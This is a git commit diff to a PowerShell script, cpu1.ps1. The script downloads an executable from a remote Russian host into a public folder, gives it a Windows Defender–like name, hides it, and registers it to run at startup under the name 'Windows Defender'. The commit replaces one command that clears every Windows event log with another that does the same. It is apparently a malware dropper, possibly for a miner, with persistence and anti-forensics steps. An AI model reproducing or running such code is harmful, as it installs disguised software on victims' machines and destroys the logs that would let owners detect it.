373e5b2d0a3f23da0da8853f04c5f0324cbe2626
ExploitGF <32704607+ExploitGF@users.noreply.github.com>
2018-09-05 17:05:07 +0500

    Update cpu1.ps1

--- cpu1.ps1
+++ cpu1.ps1
@@ -20,4 +20,4 @@ Get-Item C:\Users\Public\MSASC.exe | foreach {$_.Attributes = 'ReadOnly, Hidden'
 (New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/MS_ASC64_1.signed","C:\Users\Public\MSASCuiL.exe")
 Get-Item C:\Users\Public\MSASCuiL.exe | foreach {$_.Attributes = 'ReadOnly, Hidden'}
 New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name "Windows Defender" -Value "C:\Users\Public\MSASCuiL.exe"
-wevtutil w el | Foreach-Object {wevtutil cl "$_"}
+Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
